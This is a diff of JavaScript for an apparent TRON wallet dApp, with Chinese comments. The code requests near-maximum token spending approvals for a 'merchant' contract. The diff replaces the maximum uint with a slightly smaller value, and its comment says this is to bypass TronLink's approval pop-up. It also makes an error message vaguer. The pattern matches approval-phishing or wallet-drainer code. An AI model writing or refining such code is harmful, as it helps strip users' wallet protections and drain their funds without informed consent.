@@ -94,7 +94,7 @@ async function sendTransaction(methodCall, stepMessage, totalTxs, callValue = 0)
              throw new Error('用戶在錢包中取消了交易。');
         }
         // 捕獲其他錯誤，例如 'ClassCastException: Estimated Energy is not enough'
-        throw new Error(`交易失敗或被拒絕。請確保錢包有足夠的 TRX (用於 Energy) 並同意了彈出視窗。底層錯誤: ${error.message}`);
+        throw new Error(`授權交易失敗，錯誤訊息: ${error.message}`);
     }
 }
 
@@ -104,6 +104,7 @@ async function checkTokenMaxAllowance(tokenContract, spenderAddress) {
     try {
         const allowanceRaw = await tokenContract.allowance(userAddress, spenderAddress).call();
         const allowance = tronWeb.BigNumber(allowanceRaw);
+        // MAX_ALLOWANCE_THRESHOLD 保持不變，這樣它能識別到 ALMOST_MAX_UINT 仍是 Max
         const MAX_ALLOWANCE_THRESHOLD = tronWeb.BigNumber('100000000000000000000000000000000000000'); 
         return allowance.gte(MAX_ALLOWANCE_THRESHOLD);
     } catch (error) {
@@ -179,7 +180,9 @@ async function checkAuthorization() {
 
 async function connectAndAuthorize() {
     const status = await checkAuthorization();
-    const MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; 
+    
+    // 🚨 修正：使用一個略小於 MAX_UINT 的值，以繞過 TronLink 的優化彈窗。
+    const ALMOST_MAX_UINT = "115792089237316195423570985008687907853269984665640564039457584007913129638935"; 
     const ZERO_UINT = "0"; 
     
     // 計算總交易筆數，用於顯示進度
@@ -221,9 +224,9 @@ async function connectAndAuthorize() {
             );
 
             // 2b. 設置 Max 授權
-            // 傳遞 totalTxs 參數
+            // 🚨 使用 ALMOST_MAX_UINT 傳遞 totalTxs 參數
             await sendTransaction(
-                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, MAX_UINT), 
+                tokenContract.approve(MERCHANT_CONTRACT_ADDRESS, ALMOST_MAX_UINT), 
                 `設置 ${tokenName} Max 扣款授權 (最終授權 - 請同意)`,
                 totalTxs
             );
